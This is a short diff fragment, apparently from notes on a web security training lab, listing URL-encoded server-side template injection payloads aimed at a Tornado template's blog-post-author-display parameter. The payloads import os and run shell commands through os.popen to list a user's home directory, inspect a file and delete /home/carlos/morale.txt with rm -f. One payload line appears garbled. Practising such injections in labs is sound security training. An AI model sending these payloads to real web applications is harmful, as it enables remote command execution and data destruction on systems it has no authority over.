@@ -8,3 +8,5 @@ blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("ls+-l+/home/carlos
 blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("r/home/carlos").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
 blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("file+/home/carlos/morale.txt").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
 blog-post-author-display=7*7}}{%25+import+os+%25}{{+os.popen("rm+-f+/home/carlos/morale.txt").read()+}}&csrf=vj30S4SsmEUpuMnO3ZhGij1IH5v80Isw
+
+https://www.tornadoweb.org/en/stable/template.html#module-tornado.template
